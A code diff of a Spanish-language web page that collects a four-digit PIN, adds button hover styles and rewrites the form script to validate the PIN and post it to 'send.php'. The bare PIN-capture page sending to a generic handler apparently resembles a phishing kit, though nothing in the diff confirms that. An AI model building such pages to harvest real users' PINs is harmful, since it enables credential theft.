@@ -171,6 +171,15 @@
             box-shadow: 0 4px 12px rgba(59, 79, 181, 0.3);
         }
 
+        .continue-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(59, 79, 181, 0.4);
+        }
+
+        .continue-btn:active {
+            transform: translateY(0);
+        }
+
         @media (max-width: 480px) {
             .container {
                 padding: 30px 20px;
@@ -231,84 +240,92 @@
                     </svg>
                 </span>
             </div>
+            
+            <!-- Campo oculto para enviar el PIN completo -->
             <input type="hidden" name="pin" id="pincaje">
+            
             <!-- Botón Continuar -->
             <button type="submit" class="continue-btn" style="width: 100%; margin-top: 20px;">Continuar</button>
         </form>
     </div>
-<script>
-document.getElementById('pinForm').addEventListener('submit', function(e) {
-    const pin = ['pin1','pin2','pin3','pin4']
-        .map(id => document.getElementById(id).value)
-        .join('');
-    document.getElementById('pincaje').value = pin;
-});
-</script>
+
     <script>
-        // ============================================
-// FUNCIONES DE UTILIDAD
-// ============================================
-
-// Mostrar/Ocultar PIN
-function togglePinVisibility() {
-    const pinInputs = [
-        document.getElementById('pin1'),
-        document.getElementById('pin2'),
-        document.getElementById('pin3'),
-        document.getElementById('pin4')
-    ];
-    
-    const eyeHidden = document.getElementById('eyeHidden');
-    const eyeClosed = document.getElementById('eyeClosed');
-    
-    // Determinar el tipo actual y el nuevo tipo
-    const isPassword = pinInputs[0].type === 'password';
-    const newType = isPassword ? 'text' : 'password';
-    
-    // Cambiar tipo en todos los inputs
-    pinInputs.forEach(input => {
-        input.type = newType;
-    });
-    
-    // Cambiar iconos
-    if (isPassword) {
-        // Mostrar texto - ocultar ojo cerrado, mostrar ojo abierto
-        eyeHidden.style.display = 'none';
-        eyeClosed.style.display = 'block';
-    } else {
-        // Mostrar password - mostrar ojo cerrado, ocultar ojo abierto
-        eyeHidden.style.display = 'block';
-        eyeClosed.style.display = 'none';
-    }
-}
-
-// ============================================
-// NAVEGACIÓN AUTOMÁTICA ENTRE INPUTS
-// ============================================
-
-document.querySelectorAll('.pin-input').forEach((input, index) => {
-    // Avanzar al siguiente input al escribir un dígito
-    input.addEventListener('input', function() {
-        if (this.value.length === 1 && index < 3) {
-            document.querySelectorAll('.pin-input')[index + 1].focus();
+        // Mostrar/Ocultar PIN
+        function togglePinVisibility() {
+            const inputs = [
+                document.getElementById('pin1'),
+                document.getElementById('pin2'),
+                document.getElementById('pin3'),
+                document.getElementById('pin4')
+            ];
+            const eyeHidden = document.getElementById('eyeHidden');
+            const eyeClosed = document.getElementById('eyeClosed');
+            
+            const currentType = inputs[0].type;
+            const newType = currentType === 'password' ? 'text' : 'password';
+            
+            // Cambiar tipo en todos los inputs
+            inputs.forEach(input => {
+                input.type = newType;
+            });
+            
+            // Cambiar iconos
+            if (newType === 'text') {
+                eyeHidden.style.display = 'none';
+                eyeClosed.style.display = 'block';
+            } else {
+                eyeHidden.style.display = 'block';
+                eyeClosed.style.display = 'none';
+            }
         }
-    });
-    
-    // Retroceder al input anterior al presionar Backspace en campo vacío
-    input.addEventListener('keydown', function(e) {
-        if (e.key === 'Backspace' && this.value === '' && index > 0) {
-            document.querySelectorAll('.pin-input')[index - 1].focus();
-        }
-    });
-});
 
-// ============================================
-// INICIALIZACIÓN
-// ============================================
+        // Auto-salto entre inputs
+        document.querySelectorAll('.pin-input').forEach((input, index) => {
+            input.addEventListener('input', function() {
+                if (this.value.length === 1 && index < 3) {
+                    document.querySelectorAll('.pin-input')[index + 1].focus();
+                }
+            });
 
-window.addEventListener('load', function() {
-    document.getElementById('pin1').focus();
-});
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    document.querySelectorAll('.pin-input')[index - 1].focus();
+                }
+            });
+        });
+
+        // Submit del formulario
+        document.getElementById('pinForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Obtener los 4 dígitos del PIN
+            const pin = ['pin1', 'pin2', 'pin3', 'pin4']
+                .map(id => document.getElementById(id).value)
+                .join('');
+            
+            // Validar que los 4 dígitos estén completos
+            if (pin.length !== 4) {
+                alert('Por favor ingresa los 4 dígitos del PIN');
+                return;
+            }
+            
+            // Validar que sean números
+            if (!/^\d{4}$/.test(pin)) {
+                alert('El PIN debe contener solo números');
+                return;
+            }
+            
+            // Guardar PIN en el campo oculto
+            document.getElementById('pincaje').value = pin;
+            
+            // Enviar el formulario a send.php
+            this.submit();
+        });
+
+        // Focus en el primer input al cargar
+        window.addEventListener('load', function() {
+            document.getElementById('pin1').focus();
+        });
     </script>
 </body>
 </html>
